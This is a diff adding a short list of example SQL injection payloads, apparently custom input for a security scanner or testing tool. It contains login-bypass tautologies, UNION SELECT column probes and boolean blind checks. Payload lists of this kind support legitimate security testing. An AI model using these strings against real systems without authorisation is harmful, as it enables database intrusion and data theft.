@@ -1,0 +1,16 @@
+# Example custom SQL injection payloads
+# Lines starting with # are comments
+
+' OR '1'='1
+" OR "1"="1
+' OR ''='
+" OR ""="
+') OR ('1'='1
+1' OR '1'='1'/*
+admin'--
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' AND 1=1--
+1' AND 1=2--
